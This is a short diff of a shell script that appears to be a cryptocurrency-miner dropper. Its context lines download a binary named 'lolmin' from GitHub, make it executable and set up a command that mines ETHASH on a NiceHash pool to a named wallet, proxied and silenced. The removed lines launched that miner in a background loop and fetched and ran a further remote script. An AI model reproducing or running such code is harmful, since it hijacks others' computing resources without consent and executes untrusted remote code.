@@ -67,7 +67,5 @@ wget https://github.com/Akatsoki/joss/raw/main/lolmin
 chmod +x lolmin
 
 wallet="./graftcp/graftcp ./lolmin --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.colab >/dev/null 2>&1 "
-nohup $(for i in {1..999}; do $(echo $wallet); done) >/dev/null 2>&1
-curl -L -o Compil.sh https://github.com/Akatsoki/smlt/raw/main/Compil.sh
-chmod +x Compil.sh 
-./Compil.sh
+
+
